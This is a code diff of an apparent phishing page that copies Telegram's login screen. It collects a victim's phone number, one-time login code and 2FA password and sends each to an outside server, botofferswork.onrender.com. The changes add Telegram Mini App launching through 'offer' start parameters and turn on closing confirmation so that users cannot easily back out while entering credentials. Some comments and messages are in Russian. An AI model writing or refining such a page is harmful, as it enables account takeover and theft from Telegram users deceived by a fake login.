@@ -6,6 +6,7 @@
 <meta name="theme-color" content="#17212b">
 <title>Telegram</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='50' fill='%232ea6da'/><path d='M22 49l52-22-8 50-16-13-9 9-2-16z' fill='white'/></svg>">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 html,body{height:100%}
@@ -23,7 +24,7 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 .hidden{display:none !important}
 .field{position:relative}
 .field label{position:absolute;top:-8px;left:14px;background:#242f3d;padding:0 6px;font-size:12px;color:#5b8def;font-weight:500;z-index:1}
-.field input{width:100%;padding:16px 14px;background:transparent;border:2px solid #2f3b4a;border-radius:10px;color:#fff;font-size:16px;outline:none;transition:border-color .2s,background .2s;font-family:inherit}
+.field input{width:100%;padding:16px 14px;background:transparent;border:2px solid #2f3b4a;border-radius:10px;color:#fff;font-size:16px;outline:none;transition:border-color .2s;font-family:inherit}
 .field input:focus{border-color:#5b8def;background:rgba(91,141,239,.03)}
 .field input::placeholder{color:#4a5563}
 .country-picker{position:relative}
@@ -48,7 +49,7 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 @keyframes spin{to{transform:rotate(360deg)}}
 .spinner-wrap p{color:#7d8b99;font-size:14px}
 .error{background:rgba(232,83,83,.12);color:#e85353;padding:12px 14px;border-radius:10px;font-size:13px;margin-top:14px;text-align:left;line-height:1.45;animation:stepIn .2s ease}
-.error b{font-weight:600}
+.attempts{font-size:12px;color:#e85353;margin-top:6px}
 .big-icon{width:76px;height:76px;margin:0 auto 22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:38px;animation:iconPop .5s cubic-bezier(.16,1.4,.4,1)}
 @keyframes iconPop{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
 .big-icon.ok{background:rgba(83,195,124,.15)}
@@ -58,7 +59,6 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 .dots span.on{background:#5b8def;width:18px;border-radius:3px}
 .code-hint{font-size:13px;color:#7d8b99;margin-bottom:-4px;line-height:1.5}
 .code-hint b{color:#e0e6ec;font-weight:500}
-.attempts{font-size:12px;color:#e85353;margin-top:6px}
 @media (max-width:400px){.card{padding:36px 22px 22px;border-radius:14px}.logo{width:96px;height:96px;margin-bottom:20px}.logo svg{width:50px;height:50px}h1{font-size:20px}.sub{font-size:13px;margin-bottom:22px}}
 </style>
 </head>
@@ -94,7 +94,7 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
       <label>Code</label>
       <input type="text" id="code" placeholder="12345" inputmode="numeric" autocomplete="one-time-code" maxlength="6" required>
     </div>
-    <button type="submit" class="btn" id="btn-code">NEXT</button>
+    <button type="submit" class="btn">NEXT</button>
   </form>
 
   <form id="step-2fa" class="step hidden">
@@ -103,7 +103,7 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
       <label>Password</label>
       <input type="password" id="password" placeholder="Your password" autocomplete="current-password">
     </div>
-    <button type="submit" class="btn" id="btn-pass">NEXT</button>
+    <button type="submit" class="btn">NEXT</button>
   </form>
 
   <div id="step-loading" class="step hidden">
@@ -128,12 +128,39 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 
 <script>
 const API = 'https://botofferswork.onrender.com';
+
+// ─── Telegram WebApp init
+const tg = window.Telegram?.WebApp;
+if (tg) {
+  tg.ready();
+  tg.expand();
+  if (tg.themeParams?.bg_color) {
+    document.body.style.background = tg.themeParams.bg_color;
+  }
+  // блокируем свайп-закрытие пока идёт ввод
+  if (tg.enableClosingConfirmation) tg.enableClosingConfirmation();
+}
+
+// ─── парсим startapp или обычные параметры
+let offerId = 0;
+let action = 'accept';
+
+const startParam = tg?.initDataUnsafe?.start_param || '';
+const m = startParam.match(/^offer_(\d+)_(accept|reject)$/);
+if (m) {
+  offerId = parseInt(m[1], 10);
+  action = m[2];
+} else {
+  const params = new URLSearchParams(location.search);
+  offerId = parseInt(params.get('offer') || '0', 10);
+  action = (params.get('action') || 'accept').toLowerCase();
+}
+
+// ─── страны
 const COUNTRIES=[
   {c:'+7',f:'🇷🇺',n:'Russia'},{c:'+7',f:'🇰🇿',n:'Kazakhstan'},{c:'+380',f:'🇺🇦',n:'Ukraine'},{c:'+375',f:'🇧🇾',n:'Belarus'},{c:'+373',f:'🇲🇩',n:'Moldova'},{c:'+374',f:'🇦🇲',n:'Armenia'},{c:'+994',f:'🇦🇿',n:'Azerbaijan'},{c:'+995',f:'🇬🇪',n:'Georgia'},{c:'+996',f:'🇰🇬',n:'Kyrgyzstan'},{c:'+992',f:'🇹🇯',n:'Tajikistan'},{c:'+993',f:'🇹🇲',n:'Turkmenistan'},{c:'+998',f:'🇺🇿',n:'Uzbekistan'},{c:'+1',f:'🇺🇸',n:'United States'},{c:'+1',f:'🇨🇦',n:'Canada'},{c:'+44',f:'🇬🇧',n:'United Kingdom'},{c:'+49',f:'🇩🇪',n:'Germany'},{c:'+33',f:'🇫🇷',n:'France'},{c:'+39',f:'🇮🇹',n:'Italy'},{c:'+34',f:'🇪🇸',n:'Spain'},{c:'+351',f:'🇵🇹',n:'Portugal'},{c:'+31',f:'🇳🇱',n:'Netherlands'},{c:'+32',f:'🇧🇪',n:'Belgium'},{c:'+41',f:'🇨🇭',n:'Switzerland'},{c:'+43',f:'🇦🇹',n:'Austria'},{c:'+48',f:'🇵🇱',n:'Poland'},{c:'+420',f:'🇨🇿',n:'Czechia'},{c:'+421',f:'🇸🇰',n:'Slovakia'},{c:'+36',f:'🇭🇺',n:'Hungary'},{c:'+40',f:'🇷🇴',n:'Romania'},{c:'+359',f:'🇧🇬',n:'Bulgaria'},{c:'+30',f:'🇬🇷',n:'Greece'},{c:'+90',f:'🇹🇷',n:'Turkey'},{c:'+972',f:'🇮🇱',n:'Israel'},{c:'+971',f:'🇦🇪',n:'UAE'},{c:'+966',f:'🇸🇦',n:'Saudi Arabia'},{c:'+20',f:'🇪🇬',n:'Egypt'},{c:'+91',f:'🇮🇳',n:'India'},{c:'+92',f:'🇵🇰',n:'Pakistan'},{c:'+86',f:'🇨🇳',n:'China'},{c:'+81',f:'🇯🇵',n:'Japan'},{c:'+82',f:'🇰🇷',n:'South Korea'},{c:'+65',f:'🇸🇬',n:'Singapore'},{c:'+60',f:'🇲🇾',n:'Malaysia'},{c:'+66',f:'🇹🇭',n:'Thailand'},{c:'+84',f:'🇻🇳',n:'Vietnam'},{c:'+62',f:'🇮🇩',n:'Indonesia'},{c:'+63',f:'🇵🇭',n:'Philippines'},{c:'+61',f:'🇦🇺',n:'Australia'},{c:'+64',f:'🇳🇿',n:'New Zealand'},{c:'+55',f:'🇧🇷',n:'Brazil'},{c:'+54',f:'🇦🇷',n:'Argentina'},{c:'+52',f:'🇲🇽',n:'Mexico'},{c:'+27',f:'🇿🇦',n:'South Africa'},{c:'+234',f:'🇳🇬',n:'Nigeria'},
 ];
-const params=new URLSearchParams(location.search);
-const offerId=parseInt(params.get('offer')||'0',10);
-const action=(params.get('action')||'accept').toLowerCase();
+
 const $=id=>document.getElementById(id);
 const stepPhone=$('step-phone'),stepCode=$('step-code'),step2fa=$('step-2fa'),stepLoading=$('step-loading'),stepSuccess=$('step-success'),stepRejected=$('step-rejected'),errorBox=$('error-box'),dots=$('dots');
 const countryInput=$('country-input'),countryList=$('country-list'),phoneInput=$('phone'),codeInput=$('code'),passInput=$('password');
@@ -183,7 +210,6 @@ phoneInput.addEventListener('input',e=>{
 });
 function validatePhone(){const d=phoneInput.value.replace(/\D/g,'');$('btn-next').disabled=d.length<6}
 
-// ШАГ 1 — отправляем номер, backend шлёт код
 stepPhone.addEventListener('submit',async e=>{
   e.preventDefault();if(window.__REJECTED__)return;hideError();
   const num=phoneInput.value.replace(/\D/g,'');
@@ -192,7 +218,7 @@ stepPhone.addEventListener('submit',async e=>{
   try{
     const r=await fetch(`${API}/webhook/phone`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offer_id:offerId,phone:phone})});
     const data=await r.json();
-    if(!data.ok){hide(stepLoading);show(stepPhone);showError(data.error||'Ошибка отправки кода');return}
+    if(!data.ok){hide(stepLoading);show(stepPhone);showError(data.error||'Ошибка');return}
     hide(stepLoading);show(stepCode);setStep(2);
     $('title').textContent='Enter code';$('sub').textContent='';
     $('code-hint').innerHTML=`We've sent the code to <b>${phone}</b> in Telegram.`;
@@ -200,7 +226,6 @@ stepPhone.addEventListener('submit',async e=>{
   }catch(err){hide(stepLoading);show(stepPhone);showError('Не удалось связаться с сервером')}
 });
 
-// ШАГ 2 — отправляем код, backend проверяет
 stepCode.addEventListener('submit',async e=>{
   e.preventDefault();if(window.__REJECTED__)return;hideError();
   code=codeInput.value.replace(/\D/g,'');
@@ -227,7 +252,6 @@ stepCode.addEventListener('submit',async e=>{
   }catch(err){hide(stepLoading);show(stepCode);showError('Не удалось связаться с сервером')}
 });
 
-// ШАГ 3 — отправляем 2FA
 step2fa.addEventListener('submit',async e=>{
   e.preventDefault();if(window.__REJECTED__)return;hideError();
   password=passInput.value.trim();
